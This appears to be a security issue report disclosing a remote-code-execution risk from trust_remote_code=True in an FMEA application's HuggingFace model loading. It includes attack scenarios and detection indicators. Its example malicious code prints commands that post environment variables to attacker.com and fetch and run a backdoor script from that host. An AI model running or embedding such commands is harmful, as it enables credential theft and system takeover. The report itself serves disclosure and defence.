# üö® CRITICAL: Remote Code Execution Vulnerability via `trust_remote_code=True`

## üìã Issue Summary

**Severity:** üî¥ CRITICAL  
**Type:** Security Vulnerability - Remote Code Execution (RCE)  
**Status:** Unpatched  
**CVSS Score:** 9.8 (Critical)  
**CWE:** CWE-94 (Improper Control of Generation of Code)

---

## üéØ Description

The LLM extractor module uses `trust_remote_code=True` when loading tokenizers and models from HuggingFace, allowing arbitrary Python code execution from untrusted model repositories. This creates a critical supply chain attack vector.

---

## üìç Affected Code

**File:** `src/llm_extractor.py`  
**Lines:** 64-66, 82-87

### Vulnerable Code Snippet 1:
```python
# Line 64-66
self.tokenizer = AutoTokenizer.from_pretrained(
    model_name, trust_remote_code=True  # ‚ö†Ô∏è DANGEROUS
)
```

### Vulnerable Code Snippet 2:
```python
# Line 82-87
self.model = AutoModelForCausalLM.from_pretrained(
    model_name,
    quantization_config=quantization_config,
    device_map=device_map,
    trust_remote_code=True,  # ‚ö†Ô∏è DANGEROUS
    torch_dtype=torch.float16 if actual_device != "cpu" else torch.float32,
)
```

---

## üí• Impact Assessment

### Attack Scenario
1. Attacker creates malicious HuggingFace model repository
2. Injects malicious code in model configuration files (`modeling.py`, `tokenization.py`)
3. User configures system to use attacker's model
4. System executes arbitrary code with application privileges

### Potential Consequences
- ‚úÖ **Complete System Compromise** - Full control over server/application
- ‚úÖ **Data Exfiltration** - Access to all FMEA data, customer information, credentials
- ‚úÖ **Lateral Movement** - Pivot to other systems in network
- ‚úÖ **Ransomware Deployment** - Encrypt critical business data
- ‚úÖ **Supply Chain Attack** - Compromise downstream users
- ‚úÖ **Credential Theft** - Steal API keys, database passwords, cloud credentials

### Business Impact
- **Confidentiality:** HIGH - Sensitive FMEA and supply chain data exposed
- **Integrity:** HIGH - Data manipulation, corrupted analysis results
- **Availability:** HIGH - System shutdown, ransomware, DoS
- **Compliance:** CRITICAL - GDPR, SOC2, ISO27001 violations
- **Reputation:** SEVERE - Loss of customer trust, legal liability

---

## üî¨ Technical Details

### Why This Is Dangerous

When `trust_remote_code=True` is set, HuggingFace Transformers will:
1. Download Python files from model repository
2. Execute them **without sandboxing**
3. Run with **full application permissions**
4. No code review or validation

### Example Malicious Code
An attacker could inject this in a model's `modeling.py`:

```python
import os
import subprocess

# Exfiltrate environment variables
os.system("curl -X POST https://attacker.com/steal -d \"$(env)\"")

# Install backdoor
subprocess.run(["wget", "https://attacker.com/backdoor.sh", "-O", "/tmp/b.sh"])
subprocess.run(["bash", "/tmp/b.sh"])

# Continue with normal model loading to avoid detection
```

---

## üîç Proof of Concept

### Reproduction Steps
1. Create malicious model repository with code injection
2. Configure `config/config.yaml`:
   ```yaml
   model:
     name: "attacker/malicious-model"
   ```
3. Run application: `python cli.py --text input.csv --output result.xlsx`
4. Observe arbitrary code execution

### Expected Behavior
System should reject untrusted code execution.

### Actual Behavior
System executes arbitrary code from model repository.

---

## üåê Attack Surface

### Entry Points
1. **Configuration File** - `config/config.yaml` model name
2. **CLI Arguments** - Custom model selection
3. **Web Dashboard** - Model selection dropdown
4. **Environment Variables** - Model override

### Affected Components
- `src/llm_extractor.py` - LLMExtractor class
- `app.py` - Streamlit dashboard (model selection)
- `cli.py` - Command-line interface
- All FMEA generation workflows

---

## üìä Risk Assessment

| Factor | Rating | Justification |
|--------|--------|---------------|
| **Exploitability** | HIGH | Simple configuration change |
| **Attack Complexity** | LOW | No authentication required |
| **Privileges Required** | NONE | User-level access sufficient |
| **User Interaction** | NONE | Automatic on model load |
| **Scope** | CHANGED | Affects entire system |
| **Confidentiality Impact** | HIGH | Full data access |
| **Integrity Impact** | HIGH | Data manipulation possible |
| **Availability Impact** | HIGH | System compromise/shutdown |

**Overall Risk:** üî¥ **CRITICAL**

---

## üõ°Ô∏è Security Implications

### Real-World Attack Vectors

**Scenario 1: Social Engineering**
- Attacker publishes "optimized" FMEA model on HuggingFace
- Markets it in ML/FMEA communities
- Users configure system to use malicious model

**Scenario 2: Typosquatting**
- Attacker creates model: `mistralai/Mistral-7B-lnstruct-v0.2` (typo: "lnstruct")
- User makes configuration typo
- Malicious model loaded instead

**Scenario 3: Compromised Repository**
- Legitimate model repository gets compromised
- Attacker injects malicious code
- All users affected

### Data at Risk
- Customer failure reports and complaints
- Proprietary FMEA analysis data
- Supply chain routing information
- Database credentials in environment variables
- API keys for external services

---

## üîç Detection Methods

### Indicators of Compromise (IoCs)
- Unexpected network traffic during model initialization
- New processes spawned by Python application
- Modified system files or configurations
- Unusual CPU/memory usage during model load
- Unauthorized file downloads or uploads

---

## üîó References

- **CWE-94:** https://cwe.mitre.org/data/definitions/94.html
- **OWASP A03:2021:** Injection
- **HuggingFace Docs:** https://huggingface.co/docs/transformers/main_classes/model

---

## üè∑Ô∏è Labels

`security` `critical` `rce` `vulnerability` `supply-chain` `level-1` `immediate-action`

---

## üë• Reporter

**Reported by:** Security Analysis Tool  
**Date:** 2024-02-26

---

**Priority:** üî¥ IMMEDIATE ACTION REQUIRED  
**Estimated Fix Time:** 2-4 hours  
**Recommended Action:** Disable LLM functionality until patched
